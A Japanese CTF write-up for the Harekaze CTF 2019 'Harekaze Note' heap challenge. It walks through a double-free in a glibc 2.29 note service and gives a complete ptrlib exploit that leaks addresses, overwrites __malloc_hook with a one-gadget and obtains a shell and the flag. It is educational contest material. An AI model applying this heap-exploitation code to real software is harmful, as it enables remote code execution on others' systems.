# [pwn 300pts] Harekaze Note - Harekaze CTF 2019
64ビットで全部有効です。
```
$ checksec -f note
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes	0		2	note
```
noteを管理できるサービスです。
noteは最大0x50個までで、双方向リストにより管理されています。
note自体は次のような構造体で定義されます。
```c
typedef struct {
  char title[0x10];
  note_t *prev;
  note_t *next;
  char *content;
} note_t;
```
createするとnote自体がmallocされ、writeするとcontentがmallocされます。
deleteするとcontentとnoteを順にfreeしますが、このときcontentの中身をNULLに戻さない上、contentがfree済みかを確認せずにfreeするのでdouble freeできます。
これで一見落着と思いきや、libcのバージョンが2.29なのでtcacheがdouble freeできません。
なのでfastbinを使うのですが、contentのサイズが0x50までなのでunsorted binを使ってlibc leakすることができないという悲しい状況です。
ということで、方針としてはheapのアドレスをリークし~~、double freeでうまいこと双方向リストの先頭もしくは最後尾にあるbssセクションとのリンクからproc baseをリークし~~、さらにGOTにつなげてlibc baseをリークし、最後に`__malloc_hook`をone gadgetに書き換えるという壮大な冒険です。
※double freeしなくても偽のnote構造体をcontentsに作ってfreeしておけば勝手に繋がります。libc baseも同様です。

書いてるだけでやりたくないけど他に良い方法が思いつかないのでやります。
これを乗り越えれば何かが身につくはず。

heapのアドレスは簡単に取れます。
でも私の考えたfastbin double freeはなぜか上手くいきませんでした。（なぜかtcacheがdouble freeされる。）
競技中はshpikさんが解いてくれたのでそのコード(参考文献[1])を参考にやっていきましょう。
私はlibc-2.29をローカルでテストするために*CTFでゲットしたld-linux-2.29を使っています。（良い子はDocker環境を作りましょう。）

リークしたアドレスを見ると次のように、heap+0x108に0x00007fa5db19b080というリンクの終端(last_list)を指すポインタがあります。
```
pwndbg> x/48xg 0x7f9b2dc84260
0x7f9b2dc84260:	0x00007f9b2dc80059	0x0000000000000000
0x7f9b2dc84270:	0x00007f9b2dc842f0	0x00007f9b2dc84320
0x7f9b2dc84280:	0x00007f9b2dc842c0	0x0000000000000031
0x7f9b2dc84290:	0x00007f9b2dc80041	0x0000000000000000
0x7f9b2dc842a0:	0x00007f9b2d7c0080	0x00007f9b2dc842f0
0x7f9b2dc842b0:	0x00007f9b2dc842f0	0x0000000000000031
0x7f9b2dc842c0:	0x4141414141414141	0x4141414141414141
0x7f9b2dc842d0:	0x4141414141414141	0x4141414141414141
0x7f9b2dc842e0:	0x00007f9b2dc84398	0x0000000000000031
0x7f9b2dc842f0:	0x00007f9b2dc80058	0x0000000000000000
0x7f9b2dc84300:	0x00007f9b2dc84290	0x00007f9b2dc84260
0x7f9b2dc84310:	0x00007f9b2dc842c0	0x0000000000000031
0x7f9b2dc84320:	0x0000000000000058	0x0000000000000000
0x7f9b2dc84330:	0x00007f9b2dc84260	0x00007f9b2dc84350
0x7f9b2dc84340:	0x0000000000000000	0x0000000000000031
0x7f9b2dc84350:	0x0000000000000059	0x0000000000000000
0x7f9b2dc84360:	0x00007f9b2dc84320	0x00007f9b2d7c0080
0x7f9b2dc84370:	0x0000000000000000	0x0000000000020c91
...
```
偽のnoteを入れたnoteをfreeすると次のようにheap+0x18に繋ぎ変えられます。
```
pwndbg> x/48xg 0x7f25ef42a260
0x7f25ef42a260:	0x00007f25ef420059	0x0000000000000000
0x7f25ef42a270:	0x00007f25ef42a290	0x00007f25eecab080
0x7f25ef42a280:	0x00007f25ef42a2c0	0x0000000000000031
0x7f25ef42a290:	0x00007f25ef420041	0x0000000000000000
0x7f25ef42a2a0:	0x00007f25eecab080	0x00007f25ef42a260
...
```
~~したがって、heap+0x18を指すcontentが入った偽チャンクを作れば良いです。~~
嘘です。
さらにチャンクをmallocするので次の状態になります。
```
pwndbg> x/32xg 0x7f1789b68260
0x7f1789b68260:	0x00007f1789003258	0x0000000000000000
0x7f1789b68270:	0x00007f1789b68290	0x00007f1789b682f0
0x7f1789b68280:	0x00007f1789b682c0	0x0000000000000031
0x7f1789b68290:	0x00007f1789b60041	0x0000000000000000
0x7f1789b682a0:	0x00007f17898e9080	0x00007f1789b68260
0x7f1789b682b0:	0x00007f1789b682f0	0x0000000000000031
0x7f1789b682c0:	0x0000000000000059	0x0000000000000000
0x7f1789b682d0:	0x00007f1789b682f0	0x00007f17898e9080
0x7f1789b682e0:	0x00007f1789b68278	0x0000000000000031
```
したがって、0x78足した場所が正解です。
proc baseが求まるとGOTのアドレスが分かるので、同様にしてlibc baseをリークします。
こっちはちょこまか場所が変わらないので簡単ですね。

とりあえずここまでのコード：
```python
from ptrlib import *

def create(title):
    sock.recvuntil("Choice: ")
    sock.sendline("1")
    sock.recvuntil("Title: ")
    sock.sendline(title)

def write(title, size, data):
    sock.recvuntil("Choice: ")
    sock.sendline("2")
    sock.recvuntil("content: ")
    sock.sendline(title)
    sock.recvuntil("content: ")
    sock.sendline(str(size))
    sock.recvuntil("Content: ")
    sock.sendline(data)

def show(title):
    sock.recvuntil("Choice: ")
    sock.sendline("3")
    sock.recvuntil("content: ")
    sock.sendline(title)
    return sock.recvline().rstrip()

def delete(title):
    sock.recvuntil("Choice: ")
    sock.sendline("4")
    sock.recvuntil("delete: ")
    sock.sendline(title)

libc = ELF("./libc.so.6")
elf = ELF("./note")
#sock = Process("./note")
#sock = Socket("localhost", 4001)
sock = Socket("problem.harekaze.com", 20003)
one_gadget = 0x106ef8

## leak heap address
create("A")
create("B")
write("A", 0x28, "Hello")
write("B", 0x28, "Hello")
delete("A")
delete("B")
create("A")
addr_heap = u64(show("A"))
dump("addr heap = " + hex(addr_heap))

## leak proc base
create("X")
create("X2")
write("X", 0x28, b"A" * 0x20 + p64(addr_heap + 0x78)) # fake chunk
delete("X")
# now: tcache --> (X) --> (X->content) --> ...
create("X")
create("Y") # pon!
proc_base = u64(show("Y")) - 0x4080
dump("proc base = " + hex(proc_base))

## leak libc base
create("P")
write("P", 0x28, b"A" * 0x20 + p64(proc_base + elf.got("puts")))
delete("P")
# now: tcache --> (P) --> (P->content) --> ...
create("P")
create("Q") # pon!
libc_base = u64(show("Q")) - libc.symbol("puts")
dump("libc base = " + hex(libc_base))

sock.interactive()
```

やったー。
```
$ python solve.py 
[+] Socket: Successfully connected to problem.harekaze.com:20003
[ptrlib] addr heap = 0x559d26cfb260
[ptrlib] proc base = 0x559d259d8000
[ptrlib] libc base = 0x7f251d9bb000
1. Create note
2. Write content
3. Show content
4. Delete note
Choice: [ptrlib]$
```

同じようにして`__malloc_hook`を書き換えたいのですが、contentがNULLじゃないと二度書きできないよーと怒られます。
ここでdouble freeを使わないといけないかと思ったのですが、deleteは絶対にcontentをfreeするので、先程までと同様に偽のnoteを作って__malloc_hookのアドレスとかを書き込んでfreeしてやればOKです。
と思って次のようなコードを作ったところ
```
create("I")
write("I", 0x28, b"A" * 0x20 + p64(libc_base + libc.symbol("__malloc_hook")))
delete("I")
# now: tcache --> (I) --> (I->content) --> ...
create("I")
create("J") # pon!
delete("J")
```
死にました。
```
double free or corruption (out)
```
これはJのcontentがfreeされた後にJ自体もfreeされるからです。

double freeしないとダメなようなので、fastbinを使います。
競技中は次のようなコードでdouble freeしようとしてなぜかtcache 2で死ぬーって困っていました。
```python
for i in range(7):
    create("dummy" + str(i))
    write("dummy" + str(i), 0x38, "pon")
create("AAAA")
write("AAAA", 0x38, "Hello")
create("BBBB")
write("BBBB", 0x38, "World")
for i in range(7):
    delete("dummy" + str(i))
delete("AAAA")
create("AAAA")
delete("BBBB")
create("CCCC")
```
次のように0x28のtcacheを使ってやると直りました。なんで？
```python
for i in range(7):
    create("dummy" + str(i))
    write("dummy" + str(i), 0x38, "pon")
create("AAAA")
write("AAAA", 0x38, "Hello")
create("BBBB")
write("BBBB", 0x38, "World")
for i in range(7):
    delete("dummy" + str(i))
for i in range(7):
    create("DUMMY" + str(i))
delete("AAAA")
create("AAAA")
delete("BBBB")
delete("AAAA")
```
ちょっと眠くて原因を考えるほど頭が回りませんが、通ったのでおっけー。
あとはdupしたfastbinを使って`__malloc_hook`を書き換えるだけです。

```python
from ptrlib import *

def create(title):
    sock.recvuntil("Choice: ")
    sock.sendline("1")
    sock.recvuntil("Title: ")
    sock.sendline(title)

def write(title, size, data):
    sock.recvuntil("Choice: ")
    sock.sendline("2")
    sock.recvuntil("content: ")
    sock.sendline(title)
    sock.recvuntil("content: ")
    sock.sendline(str(size))
    sock.recvuntil("Content: ")
    sock.sendline(data)

def show(title):
    sock.recvuntil("Choice: ")
    sock.sendline("3")
    sock.recvuntil("content: ")
    sock.sendline(title)
    return sock.recvline().rstrip()

def delete(title):
    sock.recvuntil("Choice: ")
    sock.sendline("4")
    sock.recvuntil("delete: ")
    sock.sendline(title)

elf = ELF("./note")
#"""
libc = ELF("./libc.so.6")
one_gadget = 0x106ef8
sock = Socket("problem.harekaze.com", 20003)
#"""
"""
libc = ELF("./test/libc.so.6")
one_gadget = 0xdf991
sock = Socket("localhost", 4001)
#"""

## leak heap address
create("A")
create("B")
write("A", 0x28, "Hello")
write("B", 0x28, "Hello")
delete("A")
delete("B")
create("A")
addr_heap = u64(show("A"))
dump("addr heap = " + hex(addr_heap))

## leak proc base
create("X")
create("X2")
write("X", 0x28, b"A" * 0x20 + p64(addr_heap + 0x78)) # fake chunk
delete("X")
# now: tcache --> (X) --> (X->content) --> ...
create("X")
create("Y") # pon!
proc_base = u64(show("Y")) - 0x4080
dump("proc base = " + hex(proc_base))

## leak libc base
create("P")
write("P", 0x28, b"A" * 0x20 + p64(proc_base + elf.got("puts")))
delete("P")
# now: tcache --> (P) --> (P->content) --> ...
create("P")
create("Q") # pon!
libc_base = u64(show("Q")) - libc.symbol("puts")
dump("libc base = " + hex(libc_base))

## fastbin corruption attack
for i in range(7):
    create("dummy" + str(i))
    write("dummy" + str(i), 0x38, "pon")
create("AAAA")
write("AAAA", 0x38, "Hello")
create("BBBB")
write("BBBB", 0x38, "World")
for i in range(7):
    delete("dummy" + str(i))
for i in range(7):
    create("DUMMY" + str(i))
delete("AAAA")
create("AAAA")
delete("BBBB")
delete("AAAA")
# now: fastbin --> (AAAA->content) --> (BBBB->content) --> (AAAA->content)
for i in range(7):
    create("consume" + str(i))
for i in range(7):
    create("CONSUME" + str(i))
    write("CONSUME" + str(i), 0x38, "bye")
# dup
create("TARGET1")
write("TARGET1", 0x38, p64(libc_base + libc.symbol("__malloc_hook")))
create("TARGET2")
write("TARGET2", 0x38, "nope")
create("TARGET3")
write("TARGET3", 0x38, "nope")
create("GOAL")
write("GOAL", 0x38, p64(libc_base + one_gadget))

sock.interactive()
```

できたぁぁぁぁぁぁぁ！
```
$ python solve.py 
[+] Socket: Successfully connected to problem.harekaze.com:20003
[ptrlib] addr heap = 0x55f1f06bf260
[ptrlib] proc base = 0x55f1eecca000
[ptrlib] libc base = 0x7f9910280000
[ptrlib]$ 1. Create note
2. Write content
3. Show content
4. Delete note
Choice: 1
[ptrlib]$ ls /home
[ptrlib]$ note
cat /home/note/flag
[ptrlib]$ HarekazeCTF{d0u613_fr3e_1n_7c4ch3_15_n0_10ng3r_4va1l4613}
```

長い道のりだった。

# 感想
面白かったです。
頭がかたいと全部fastbin attackで解決しようとするのでダメですね。
せっかくポインタを持つ構造体がmallocされるんだから活用しないと。

# 参考文献
[1] [https://gist.github.com/SeahunOh/394e37990c5b60f3216bb28b32a0e46b](https://gist.github.com/SeahunOh/394e37990c5b60f3216bb28b32a0e46b)